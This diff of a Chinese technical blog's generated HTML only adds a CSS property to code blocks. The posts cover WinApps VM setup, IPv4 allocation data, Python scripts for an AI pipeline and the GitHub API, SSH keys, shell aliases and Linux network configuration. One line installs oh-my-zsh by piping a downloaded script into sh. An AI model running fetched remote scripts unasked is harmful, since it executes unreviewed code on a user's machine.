@@ -65,10 +65,10 @@
 &lt;p&gt;第一步：创建虚拟机&lt;/p&gt;
 &lt;p&gt;文档链接：https://github.com/winapps-org/winapps/blob/main/docs/libvirt.md&lt;/p&gt;
 &lt;p&gt;第二步：安装客户端依赖的工具&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo pacman -Syu --needed -y curl dialog freerdp git iproute2 libnotify openbsd-netcat
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo pacman -Syu --needed -y curl dialog freerdp git iproute2 libnotify openbsd-netcat
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第三步：创建配置文件&lt;/p&gt;
 &lt;p&gt;我有两个虚拟机，一个办公，一个开发（Visual Studio）&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;╭─arch@archlinux ~
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;╭─arch@archlinux ~
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;╰─$ virsh list --all
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Id 名称 状态
@@ -76,7 +76,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; RDPWindows 运行
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#ae81ff"&gt;3&lt;/span&gt; Win10 运行
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;配置文件：&lt;code&gt;$HOME/.config/winapps/winapps.conf&lt;/code&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-ini" data-lang="ini"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;RDP_USER&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;username&amp;#34;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-ini" data-lang="ini"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;RDP_USER&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;username&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;RDP_PASS&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;password&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;RDP_IP&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;192.168.0.1&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 缩放，高分辨率大显示屏需要调整，默认值 100&lt;/span&gt;
@@ -89,7 +89,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在这一步我读了WinApps的脚本文件：https://github.com/winapps-org/winapps/blob/main/bin/winapps&lt;/p&gt;
 &lt;p&gt;给脚本做了一些优化，方便我可以连接多个虚拟机。&lt;/p&gt;
 &lt;p&gt;配置文件：&lt;code&gt;$HOME/.config/winapps/winapps-dev.conf&lt;/code&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-ini" data-lang="ini"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 要连接的主机名，需要与virsh列出的相同&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-ini" data-lang="ini"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 要连接的主机名，需要与virsh列出的相同&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;VM_NAME&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;Win10&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;RDP_USER&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;username&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;RDP_PASS&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;password&amp;#34;&lt;/span&gt;
@@ -179,7 +179,7 @@ MBTI 由美国人凯瑟琳·库克·布里格斯 （Katharine Cook Briggs） 和
 &lt;p&gt;&lt;a href="https://data.iana.org/rdap/ipv4.json"&gt;https://data.iana.org/rdap/ipv4.json&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;这个网址是IANA互联网分配号码权威机构的数据网址，上面显示了全球的IPv4在不同信息中心的分配情况，我在中国解析后的地址是属于ICANN的，可见应该是做了一些网络优化。&lt;/p&gt;
 &lt;p&gt;在响应的Json结构中，我们可以先关注一下APNIC的数据，这部分指的是亚太信息中心管理的IP资源，而中国区域就属于这部分：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-jsx" data-lang="jsx"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;.....
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-jsx" data-lang="jsx"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;.....
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;[
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;1.0.0.0/8&amp;#34;&lt;/span&gt;,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;14.0.0.0/8&amp;#34;&lt;/span&gt;,
@@ -270,7 +270,7 @@ process_group:
  stream: &amp;#34;/path/to/script.py&amp;#34;
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id="编写交互stream"&gt;编写交互Stream&lt;/h2&gt;
 &lt;p&gt;&lt;code&gt;Stream&lt;/code&gt;其实就是和&lt;code&gt;Qpipe&lt;/code&gt;进行通信的脚本，主要处理任务的逻辑都在这个脚本中，原理上就是通过&lt;code&gt;Qpipe&lt;/code&gt;定时启动脚本，&lt;code&gt;Qpipe&lt;/code&gt;会在后台启动一个http服务用来接收数据发送给AI接口，当前只支持智谱。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#!/usr/bin/env python3&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; os
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; pandas &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; pd
@@ -367,7 +367,7 @@ process_group:
 &lt;/ul&gt;
 &lt;h2 id="编写访问github-api的插件"&gt;🔧编写访问Github API的插件&lt;/h2&gt;
 &lt;p&gt;为了实现能够将Github的Star项目输入给AI，首先需要编写一个插件，这个插件用于访问Github API接口：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; os
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 获取Github访问令牌&lt;/span&gt;
@@ -456,7 +456,7 @@ process_group:
 &lt;/aside&gt;
 &lt;h3 id="使用带密码的私钥"&gt;使用带密码的私钥&lt;/h3&gt;
 &lt;p&gt;使用带密码的私钥能够确保公私钥文件被窃取后，依然无法使用。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# ssh-keygen 命令&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# ssh-keygen 命令&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ ssh-keygen -t rsa -f secret-key
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Generating public/private rsa key pair.
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Enter passphrase &lt;span style="color:#f92672"&gt;(&lt;/span&gt;empty &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; no passphrase&lt;span style="color:#f92672"&gt;)&lt;/span&gt;: &lt;span style="color:#75715e"&gt;# 输入密码&lt;/span&gt;
@@ -467,7 +467,7 @@ process_group:
 &lt;/p&gt;
 &lt;h3 id="使用命令行提示工具-oh-my-zsh"&gt;使用命令行提示工具 oh-my-zsh&lt;/h3&gt;
 &lt;p&gt;&lt;a href="https://ohmyz.sh/"&gt;oh my zsh&lt;/a&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ sh -c &lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;$(&lt;/span&gt;curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh&lt;span style="color:#66d9ef"&gt;)&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ sh -c &lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;$(&lt;/span&gt;curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh&lt;span style="color:#66d9ef"&gt;)&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ vim .zshrc
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
@@ -485,7 +485,7 @@ process_group:
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="使用更好的替代命令"&gt;使用更好的替代命令&lt;/h3&gt;
 &lt;p&gt;在Linux命令行下，会经常使用系统命令进行工作，但是内置的命令功能很单一，需要做一些增强，我这里摘取部分配置：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# https://github.com/AmineZouitine/rmt.rs&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# https://github.com/AmineZouitine/rmt.rs&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 删除文件备份&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;alias rm&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;rmt&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# https://github.com/lsd-rs/lsd&lt;/span&gt;
@@ -515,7 +515,7 @@ process_group:
 &lt;pre tabindex="0"&gt;&lt;code&gt;nameserver 114.114.114.114
 nameserver 8.8.8.8
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修改 &lt;code&gt;/etc/NetworkManager/NetworkManager.conf&lt;/code&gt; 文件，在main部分添加 “dns=none” 选项：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-cpp" data-lang="cpp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;[main]
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-cpp" data-lang="cpp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;[main]
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#plugins=ifcfg-rh
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;dns&lt;span style="color:#f92672"&gt;=&lt;/span&gt;none
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;网络IP地址配置文件在 &lt;code&gt;/etc/sysconfig/network-scripts&lt;/code&gt; 文件夹下：&lt;/p&gt;
@@ -529,7 +529,7 @@ nameserver 8.8.8.8
 &lt;/a&gt;
 &lt;/p&gt;
 &lt;p&gt;&lt;code&gt;/etc/sysconfig/network-scripts/ifcfg-eth1-1&lt;/code&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-cpp" data-lang="cpp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;HWADDR&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;00&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;C:&lt;span style="color:#ae81ff"&gt;29&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;B:&lt;span style="color:#ae81ff"&gt;16&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;B4
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-cpp" data-lang="cpp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;HWADDR&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;00&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;C:&lt;span style="color:#ae81ff"&gt;29&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;B:&lt;span style="color:#ae81ff"&gt;16&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;B4
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;TYPE&lt;span style="color:#f92672"&gt;=&lt;/span&gt;Ethernet
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;PROXY_METHOD&lt;span style="color:#f92672"&gt;=&lt;/span&gt;none
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BROWSER_ONLY&lt;span style="color:#f92672"&gt;=&lt;/span&gt;no
@@ -548,7 +548,7 @@ nameserver 8.8.8.8
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;DEVICE&lt;span style="color:#f92672"&gt;=&lt;/span&gt;eth1
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ONBOOT&lt;span style="color:#f92672"&gt;=&lt;/span&gt;no
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;观察启动命令行：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-cpp" data-lang="cpp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;/&lt;/span&gt;home&lt;span style="color:#f92672"&gt;/&lt;/span&gt;leagsoft&lt;span style="color:#f92672"&gt;/&lt;/span&gt;SafeDataExchange&lt;span style="color:#f92672"&gt;/&lt;/span&gt;jdk&lt;span style="color:#f92672"&gt;/&lt;/span&gt;bin&lt;span style="color:#f92672"&gt;/&lt;/span&gt;java &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Dnop &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Djava.util.logging.manager&lt;span style="color:#f92672"&gt;=&lt;/span&gt;org.apache.juli.ClassLoaderLogManager &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Dlog4j2.formatMsgNoLookups&lt;span style="color:#f92672"&gt;=&lt;/span&gt;true &lt;span style="color:#f92672"&gt;-&lt;/span&gt;javaagent:&lt;span style="color:#f92672"&gt;/&lt;/span&gt;home&lt;span style="color:#f92672"&gt;/&lt;/span&gt;leagsoft&lt;span style="color:#f92672"&gt;/&lt;/span&gt;SafeDataExchange&lt;span style="color:#f92672"&gt;/&lt;/span&gt;Apache&lt;span style="color:#f92672"&gt;/&lt;/span&gt;lib&lt;span style="color:#f92672"&gt;/&lt;/span&gt;jdc.jar &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Djdk.tls.ephemeralDHKeySize&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;2048&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Djava.protocol.handler.pkgs&lt;span style="color:#f92672"&gt;=&lt;/span&gt;org.apache.catalina.webresources &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Dorg.apache.catalina.security.SecurityListener.UMASK&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0022&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Dignore.endorsed.dirs&lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt;classpath &lt;span style="color:#f92672"&gt;/&lt;/span&gt;home&lt;span style="color:#f92672"&gt;/&lt;/span&gt;leagsoft&lt;span style="color:#f92672"&gt;/&lt;/span&gt;SafeDataExchange&lt;span style="color:#f92672"&gt;/&lt;/span&gt;Apache&lt;span style="color:#f92672"&gt;/&lt;/span&gt;bin&lt;span style="color:#f92672"&gt;/&lt;/span&gt;bootstrap.jar:&lt;span style="color:#f92672"&gt;/&lt;/span&gt;home&lt;span style="color:#f92672"&gt;/&lt;/span&gt;leagsoft&lt;span style="color:#f92672"&gt;/&lt;/span&gt;SafeDataExchange&lt;span style="color:#f92672"&gt;/&lt;/span&gt;Apache&lt;span style="color:#f92672"&gt;/&lt;/span&gt;bin&lt;span style="color:#f92672"&gt;/&lt;/span&gt;tomcat&lt;span style="color:#f92672"&gt;-&lt;/span&gt;juli.jar &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Dcatalina.base&lt;span style="color:#f92672"&gt;=/&lt;/span&gt;home&lt;span style="color:#f92672"&gt;/&lt;/span&gt;leagsoft&lt;span style="color:#f92672"&gt;/&lt;/span&gt;SafeDataExchange&lt;span style="color:#f92672"&gt;/&lt;/span&gt;Apache &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Dcatalina.home&lt;span style="color:#f92672"&gt;=/&lt;/span&gt;home&lt;span style="color:#f92672"&gt;/&lt;/span&gt;leagsoft&lt;span style="color:#f92672"&gt;/&lt;/span&gt;SafeDataExchange&lt;span style="color:#f92672"&gt;/&lt;/span&gt;Apache &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Djava.io.tmpdir&lt;span style="color:#f92672"&gt;=/&lt;/span&gt;home&lt;span style="color:#f92672"&gt;/&lt;/span&gt;leagsoft&lt;span style="color:#f92672"&gt;/&lt;/span&gt;SafeDataExchange&lt;span style="color:#f92672"&gt;/&lt;/span&gt;Apache&lt;span style="color:#f92672"&gt;/&lt;/span&gt;temp org.apache.catalina.startup.Bootstrap start
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-cpp" data-lang="cpp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;/&lt;/span&gt;home&lt;span style="color:#f92672"&gt;/&lt;/span&gt;leagsoft&lt;span style="color:#f92672"&gt;/&lt;/span&gt;SafeDataExchange&lt;span style="color:#f92672"&gt;/&lt;/span&gt;jdk&lt;span style="color:#f92672"&gt;/&lt;/span&gt;bin&lt;span style="color:#f92672"&gt;/&lt;/span&gt;java &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Dnop &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Djava.util.logging.manager&lt;span style="color:#f92672"&gt;=&lt;/span&gt;org.apache.juli.ClassLoaderLogManager &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Dlog4j2.formatMsgNoLookups&lt;span style="color:#f92672"&gt;=&lt;/span&gt;true &lt;span style="color:#f92672"&gt;-&lt;/span&gt;javaagent:&lt;span style="color:#f92672"&gt;/&lt;/span&gt;home&lt;span style="color:#f92672"&gt;/&lt;/span&gt;leagsoft&lt;span style="color:#f92672"&gt;/&lt;/span&gt;SafeDataExchange&lt;span style="color:#f92672"&gt;/&lt;/span&gt;Apache&lt;span style="color:#f92672"&gt;/&lt;/span&gt;lib&lt;span style="color:#f92672"&gt;/&lt;/span&gt;jdc.jar &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Djdk.tls.ephemeralDHKeySize&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;2048&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Djava.protocol.handler.pkgs&lt;span style="color:#f92672"&gt;=&lt;/span&gt;org.apache.catalina.webresources &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Dorg.apache.catalina.security.SecurityListener.UMASK&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0022&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Dignore.endorsed.dirs&lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt;classpath &lt;span style="color:#f92672"&gt;/&lt;/span&gt;home&lt;span style="color:#f92672"&gt;/&lt;/span&gt;leagsoft&lt;span style="color:#f92672"&gt;/&lt;/span&gt;SafeDataExchange&lt;span style="color:#f92672"&gt;/&lt;/span&gt;Apache&lt;span style="color:#f92672"&gt;/&lt;/span&gt;bin&lt;span style="color:#f92672"&gt;/&lt;/span&gt;bootstrap.jar:&lt;span style="color:#f92672"&gt;/&lt;/span&gt;home&lt;span style="color:#f92672"&gt;/&lt;/span&gt;leagsoft&lt;span style="color:#f92672"&gt;/&lt;/span&gt;SafeDataExchange&lt;span style="color:#f92672"&gt;/&lt;/span&gt;Apache&lt;span style="color:#f92672"&gt;/&lt;/span&gt;bin&lt;span style="color:#f92672"&gt;/&lt;/span&gt;tomcat&lt;span style="color:#f92672"&gt;-&lt;/span&gt;juli.jar &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Dcatalina.base&lt;span style="color:#f92672"&gt;=/&lt;/span&gt;home&lt;span style="color:#f92672"&gt;/&lt;/span&gt;leagsoft&lt;span style="color:#f92672"&gt;/&lt;/span&gt;SafeDataExchange&lt;span style="color:#f92672"&gt;/&lt;/span&gt;Apache &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Dcatalina.home&lt;span style="color:#f92672"&gt;=/&lt;/span&gt;home&lt;span style="color:#f92672"&gt;/&lt;/span&gt;leagsoft&lt;span 